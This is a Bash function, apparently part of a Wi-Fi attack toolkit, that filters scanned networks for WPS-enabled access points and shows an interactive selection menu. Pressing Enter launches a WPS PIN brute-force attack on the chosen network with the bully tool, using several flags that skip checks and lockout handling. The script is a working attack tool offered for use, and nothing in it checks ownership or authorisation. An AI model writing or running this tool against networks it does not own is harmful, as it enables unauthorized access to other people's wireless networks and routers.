function Crack_WPS(){

    CSV_FILE="${BatLinux["Main_DIR"]}/${BatLinux["Networks_File"]}"
    selected=0
    # Filter only networks with WPS=Yes
    IFS=$'\n' read -d '' -r -a all_lines < <(tail -n +2 "$CSV_FILE")
    # Initialize empty array for WPS enabled networks
    lines=()
    for line in "${all_lines[@]}"; do
        IFS=',' read -r ESSID BSSID Channel WPS Note <<< "$line"
        if [ "$WPS" = "Yes" ]; then
            lines+=("$line")
        fi
    done
    total_lines=${#lines[@]}

    # Check if any WPS networks were found
    if [ $total_lines -eq 0 ]; then
        echo "No networks with WPS enabled were found."
        read -n 1 -s -r -p "Press any key to return..."
        return
    fi

    Draw_Network_Menu() {
    clear
    echo "=== WPS Networks ==="
    echo "---------------------------------------------------"
    echo "ESSID • BSSID • Channel"
        for i in "${!lines[@]}"; do
            IFS=',' read -r ESSID BSSID Channel WPS Note <<< "${lines[$i]}"
            if [ $i -eq $selected ]; then
                echo -e ">\e[96m $ESSID • $BSSID • $Channel\e[0m"
                selected_note="$Note"
            else
                echo -e "$ESSID •  $BSSID •  $Channel"
            fi
        done
        echo "---------------------------------------------------"
        echo "[Note] $selected_note"
    }

function Bruteforce() {
    clear
    IFS=',' read -r ESSID BSSID Channel <<< "${lines[$selected]}"
    bully wlan0 -b $BSSID -c $Channel -S -L -F -B -d
    wait
    Crack_WPS
}

# Handle keyboard input
while true; do
    Draw_Network_Menu
    read -rsn1 key
    case "$key" in
        $'\x1B')  # Handle arrow keys
            read -rsn2 key
            case "$key" in
                "[A") # Up arrow
                    ((selected--))
                    [ $selected -lt 0 ] && selected=$((total_lines-1))
                    ;;
                "[B") # Down arrow
                    ((selected++))
                    [ $selected -ge $total_lines ] && selected=0
                    ;;
            esac
            ;;
        "") # Enter key
            Bruteforce
            break 
            ;;
        [qQ]) # Quit
            clear
            return
            ;;
    esac
    done

}